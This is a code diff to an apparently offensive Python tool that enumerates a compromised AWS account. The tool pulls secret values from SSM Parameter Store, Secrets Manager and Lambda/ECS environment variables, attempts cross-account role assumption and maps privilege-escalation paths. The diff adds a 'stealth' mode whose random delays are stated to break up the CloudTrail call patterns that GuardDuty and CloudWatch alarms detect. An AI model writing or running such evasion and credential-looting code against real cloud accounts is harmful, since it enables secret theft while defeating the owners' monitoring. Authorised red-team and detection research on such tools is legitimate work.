@@ -35,9 +35,18 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 def jitter(stealth=False, min_s=0.5, max_s=2.5):
-    """Sleep a random amount if stealth mode is on"""
+    """Sleep a random amount if stealth mode is on. Use between distinct
+    checks/regions/accounts to break up the CloudTrail call-volume burst
+    that GuardDuty's anomaly models and velocity-based CloudWatch alarms
+    key off of."""
     if stealth:
         _time.sleep(random.uniform(min_s, max_s))
+
+
+def micro_jitter(stealth=False, min_s=0.1, max_s=0.4):
+    """Shorter jitter for per-resource loops (buckets, params, secrets) where
+    cardinality can be in the hundreds — keeps stealth mode from taking hours."""
+    jitter(stealth, min_s, max_s)
 
 DEFAULT_ROLE_NAME = ""
 
@@ -635,9 +644,14 @@ Examples:
     opts.add_argument("--fast", action="store_true",
                       help="Skip IAM privilege simulation")
     opts.add_argument("--stealth", action="store_true",
-                      help="Stealth mode — skips noisy checks (simulate_principal_policy, "
-                           "SendCommand test, cross-account role attempts), adds random jitter "
-                           "between API calls (0.5-2.5s). Slower but quieter.")
+                      help="Stealth mode — skips outright noisy checks (iam:SimulatePrincipalPolicy, "
+                           "the SSM SendCommand RCE test) and adds random jitter between every "
+                           "check/region/account boundary (0.5-2.5s) plus every per-resource call "
+                           "(S3 buckets, SSM params, SM secrets, ECS task defs, role-assumption "
+                           "attempts — 0.1-0.4s) to break up the CloudTrail call-volume burst that "
+                           "GuardDuty anomaly detection and velocity-based CloudWatch alarms key off "
+                           "of. Does NOT skip requested cross-account role assumption (--accounts/"
+                           "--org-enum) or reduce enumeration scope — only throttles it. Slower but quieter.")
     opts.add_argument("--timeout", type=int, default=10,
                       help="Request timeout in seconds (default: 10)")
 
@@ -859,7 +873,7 @@ def check_privs(key_id, secret, token, region, timeout, identity):
     return {"allowed": allowed, "denied_count": len(denied), "high_value": high_value}
 
 
-def check_s3(key_id, secret, token, region, timeout):
+def check_s3(key_id, secret, token, region, timeout, stealth=False):
     client = make_client("s3", key_id, secret, token, region, timeout)
     result, err = safe(client.list_buckets)
     if err:
@@ -886,6 +900,7 @@ def check_s3(key_id, secret, token, region, timeout):
 
     # Deeper enumeration per bucket (read-only, stealthy)
     for bname in names:
+        micro_jitter(stealth)
         # Check public access — GetBucketPolicyStatus is a lightweight read-only call
         pol_status, _ = safe(client.get_bucket_policy_status, Bucket=bname)
         if pol_status and pol_status.get("PolicyStatus", {}).get("IsPublic"):
@@ -1059,6 +1074,7 @@ def check_ssm(key_id, secret, token, region, timeout,
         values_file = os.path.join(out_dir, f"ssm_secrets_{account_id}_{region}.txt")
         readable = {}
         for name in param_names:
+            micro_jitter(stealth)
             val, _ = safe(client.get_parameter, Name=name, WithDecryption=True)
             if val:
                 readable[name] = {
@@ -1106,7 +1122,8 @@ def check_ssm(key_id, secret, token, region, timeout,
 
 
 def check_secrets_manager(key_id, secret, token, region, timeout,
-                           pull_secrets=False, out_dir="/tmp", account_id="unknown"):
+                           pull_secrets=False, out_dir="/tmp", account_id="unknown",
+                           stealth=False):
     client = make_client("secretsmanager", key_id, secret, token, region, timeout)
     all_secrets = []
     try:
@@ -1140,6 +1157,7 @@ def check_secrets_manager(key_id, secret, token, region, timeout,
         values_file = os.path.join(out_dir, f"sm_secrets_{account_id}_{region}.txt")
         readable = {}
         for name in secret_names:
+            micro_jitter(stealth)
             val, _ = safe(client.get_secret_value, SecretId=name)
             if val:
                 readable[name] = val.get("SecretString") or str(val.get("SecretBinary", ""))
@@ -1254,7 +1272,7 @@ def check_logs(key_id, secret, token, region, timeout):
 
 # ─── New Checks: Env Vars, Role Trusts, Loot ─────────────────────────────────
 
-def check_env_vars(key_id, secret, token, region, timeout):
+def check_env_vars(key_id, secret, token, region, timeout, stealth=False):
     """Extract environment variables from Lambda, ECS task defs — credential goldmine."""
     result = {"lambda": [], "ecs": []}
 
@@ -1297,6 +1315,7 @@ def check_env_vars(key_id, secret, token, region, timeout):
     task_defs, _ = safe(ecs.list_task_definitions, status="ACTIVE")
     if task_defs:
         for arn in task_defs.get("taskDefinitionArns", [])[:20]:
+            micro_jitter(stealth)
             td, _ = safe(ecs.describe_task_definition, taskDefinition=arn)
             if td:
                 for container in td.get("taskDefinition", {}).get("containerDefinitions", []):
@@ -1872,6 +1891,7 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
     regions = ALL_REGIONS if args.all_regions else DEFAULT_REGIONS
     pull = args.pull_secrets
     out_dir = args.out_dir
+    stealth = getattr(args, "stealth", False)
 
     result = {
         "key_id": key_id,
@@ -1919,11 +1939,12 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
         ssm_total_params = 0
         sm_total = 0
         for r in regions:
+            micro_jitter(stealth)
             print(f"{ts()}   → {r}...", flush=True)
             ssm = check_ssm(key_id, secret, token, r, timeout,
                             pull_secrets=True, out_dir=out_dir,
                             account_id=f"{account_id}",
-                            stealth=getattr(args, "stealth", False))
+                            stealth=stealth)
             result["ssm"][r] = ssm
             param_count = ssm.get("parameter_count", 0)
             ssm_total_params += param_count
@@ -1936,7 +1957,8 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
 
             sm = check_secrets_manager(key_id, secret, token, r, timeout,
                                         pull_secrets=True, out_dir=out_dir,
-                                        account_id=f"{account_id}")
+                                        account_id=f"{account_id}",
+                                        stealth=stealth)
             result["secrets_manager"][r] = sm
             if "error" not in sm and sm.get("total", 0) > 0:
                 sm_total += sm["total"]
@@ -1963,6 +1985,7 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
         print(f"{ts()} [1b] Assuming {args.role_name} in {len(assume_accounts)} account(s)...", flush=True)
 
         for acct_id, alias in assume_accounts.items():
+            micro_jitter(stealth)
             print(f"{ts()}   Trying {args.role_name} @ {alias} ({acct_id})...", flush=True)
             creds_tuple = try_assume_role(key_id, secret, token, region, timeout, args.role_name, acct_id, partition)
             if creds_tuple:
@@ -1986,6 +2009,7 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
         result["credential_used"] = {"key_id": key_id, "label": "base", "arn": identity["arn"]}
 
     # [2] IAM
+    jitter(stealth)
     print(f"{ts()} [2] IAM...", flush=True)
     iam = check_iam(key_id, secret, token, region, timeout, identity)
     result["iam"] = iam
@@ -2004,8 +2028,8 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
         print(f"{ts()}   Visible roles : {len(iam['visible_roles'])}", flush=True)
 
     # [3] Privilege simulation
-    jitter(getattr(args, "stealth", False))
-    if getattr(args, "stealth", False):
+    jitter(stealth)
+    if stealth:
         print(f"{ts()} [3] Privilege simulation — SKIPPED (stealth mode)", flush=True)
         result["privs"] = {"skipped": "stealth mode"}
     elif not args.fast:
@@ -2074,9 +2098,9 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
         print(f"{ts()}   Privesc paths saved → {privesc_file}", flush=True)
 
     # [4] S3
-    jitter(getattr(args, "stealth", False))
+    jitter(stealth)
     print(f"{ts()} [4] S3...", flush=True)
-    s3 = check_s3(key_id, secret, token, region, timeout)
+    s3 = check_s3(key_id, secret, token, region, timeout, stealth=stealth)
     result["s3"] = s3
     if "error" not in s3:
         print(f"{ts()}   Total     : {s3['total']}", flush=True)
@@ -2098,11 +2122,13 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
         print(f"{ts()}   ✗ {s3['error']}", flush=True)
 
     # [5] EC2 — all regions
+    jitter(stealth)
     print(f"{ts()} [5] EC2 (all {len(regions)} regions)...", flush=True)
     result["ec2"] = {}
     ec2_total_inst = 0
     ec2_total_vpcs = 0
     for r in regions:
+        micro_jitter(stealth)
         ec2 = check_ec2(key_id, secret, token, r, timeout)
         inst = ec2.get("running_count", 0)
         vpcs = len(ec2.get("vpcs", []))
@@ -2118,7 +2144,7 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
     print(f"{ts()}   Total: {ec2_total_inst} instances, {ec2_total_vpcs} VPCs", flush=True)
 
     # [6] EKS via list-clusters API
-    jitter(getattr(args, "stealth", False))
+    jitter(stealth)
     print(f"{ts()} [6] EKS clusters across {len(regions)} regions...", flush=True)
     eks = check_eks(key_id, secret, token, timeout, regions)
     result["eks"] = eks
@@ -2134,10 +2160,12 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
         print(f"{ts()}   No clusters accessible via list-clusters", flush=True)
 
     # [7] ECR — all regions
+    jitter(stealth)
     print(f"{ts()} [7] ECR (all {len(regions)} regions)...", flush=True)
     result["ecr"] = {}
     ecr_total = 0
     for r in regions:
+        micro_jitter(stealth)
         ecr = check_ecr(key_id, secret, token, r, timeout)
         if ecr["total"] > 0:
             result["ecr"][r] = ecr
@@ -2150,16 +2178,18 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
     print(f"{ts()}   Total across all regions: {ecr_total} repos", flush=True)
 
     # [8] SSM — all regions
+    jitter(stealth)
     print(f"{ts()} [8] SSM (all {len(regions)} regions)...", flush=True)
     result["ssm"] = {}
     ssm_total_params = 0
     ssm_total_instances = 0
     for r in regions:
+        micro_jitter(stealth)
         print(f"{ts()}   → {r}...", flush=True)
         ssm = check_ssm(key_id, secret, token, r, timeout,
                         pull_secrets=pull, out_dir=out_dir,
                         account_id=f"{account_id}",
-                        stealth=getattr(args, "stealth", False))
+                        stealth=stealth)
         result["ssm"][r] = ssm
         inst_count = ssm.get("managed_instances_count", 0)
         param_count = ssm.get("parameter_count", 0)
@@ -2184,14 +2214,17 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
     print(f"{ts()}   Total across all regions: {ssm_total_instances} instances, {ssm_total_params} params", flush=True)
 
     # [9] Secrets Manager — all regions
+    jitter(stealth)
     print(f"{ts()} [9] Secrets Manager (all {len(regions)} regions)...", flush=True)
     result["secrets_manager"] = {}
     sm_total = 0
     for r in regions:
+        micro_jitter(stealth)
         print(f"{ts()}   → {r}...", flush=True)
         sm = check_secrets_manager(key_id, secret, token, r, timeout,
                                     pull_secrets=pull, out_dir=out_dir,
-                                    account_id=f"{account_id}")
+                                    account_id=f"{account_id}",
+                                    stealth=stealth)
         result["secrets_manager"][r] = sm
         if "error" not in sm and sm.get("total", 0) > 0:
             sm_total += sm["total"]
@@ -2205,11 +2238,13 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
     print(f"{ts()}   Total across all regions: {sm_total} secrets", flush=True)
 
     # [10] RDS — all regions
+    jitter(stealth)
     print(f"{ts()} [10] RDS (all {len(regions)} regions)...", flush=True)
     result["rds"] = {}
     rds_total_inst = 0
     rds_total_clus = 0
     for r in regions:
+        micro_jitter(stealth)
         rds = check_rds(key_id, secret, token, r, timeout)
         inst = rds.get("instances", [])
         clus = rds.get("clusters", [])
@@ -2226,10 +2261,12 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
     print(f"{ts()}   Total: {rds_total_inst} instances, {rds_total_clus} clusters", flush=True)
 
     # [11] Lambda — all regions
+    jitter(stealth)
     print(f"{ts()} [11] Lambda (all {len(regions)} regions)...", flush=True)
     result["lambda"] = {}
     lambda_total = 0
     for r in regions:
+        micro_jitter(stealth)
         lam = check_lambda(key_id, secret, token, r, timeout)
         if lam["total"] > 0:
             result["lambda"][r] = lam
@@ -2242,10 +2279,12 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
     print(f"{ts()}   Total: {lambda_total} functions", flush=True)
 
     # [12] CloudWatch Logs — all regions
+    jitter(stealth)
     print(f"{ts()} [12] CloudWatch Logs (all {len(regions)} regions)...", flush=True)
     result["logs"] = {}
     logs_total = 0
     for r in regions:
+        micro_jitter(stealth)
         logs = check_logs(key_id, secret, token, r, timeout)
         if "error" not in logs and logs.get("total", 0) > 0:
             result["logs"][r] = logs
@@ -2256,6 +2295,7 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
     print(f"{ts()}   Total: {logs_total} log groups", flush=True)
 
     # [13] Organizations
+    jitter(stealth)
     print(f"{ts()} [13] Organizations...", flush=True)
     org = check_org(key_id, secret, token, region, timeout, partition)
     result["organizations"] = org
@@ -2275,13 +2315,15 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
         print(f"{ts()}   ✗ {org['error']}", flush=True)
 
     # [14] Environment variables (Lambda + ECS)
+    jitter(stealth)
     print(f"{ts()} [14] Environment variables (all {len(regions)} regions)...", flush=True)
     result["env_vars"] = {}
     env_total_lambda = 0
     env_total_ecs = 0
     env_interesting = 0
     for r in regions:
-        ev = check_env_vars(key_id, secret, token, r, timeout)
+        micro_jitter(stealth)
+        ev = check_env_vars(key_id, secret, token, r, timeout, stealth=stealth)
         if ev.get("lambda") or ev.get("ecs"):
             result["env_vars"][r] = ev
             env_total_lambda += len(ev.get("lambda", []))
@@ -2325,6 +2367,7 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
         print(f"{ts()}   Env vars saved → {env_file}", flush=True)
 
     # [15] Role trust analysis
+    jitter(stealth)
     print(f"{ts()} [15] Role trust analysis...", flush=True)
     current_arn = identity.get("arn") if identity else None
     current_account = identity.get("account") if identity else None
@@ -2622,6 +2665,7 @@ if __name__ == "__main__":
                 saved_no_assume = args.no_assume
 
                 for i, acct in enumerate(active, 1):
+                    jitter(getattr(args, "stealth", False))
                     acct_id = acct.get("id", "unknown")
                     acct_name = acct.get("name", acct_id)
                     print(f"\n{ts()} [{i}/{len(active)}] {acct_name} ({acct_id})")
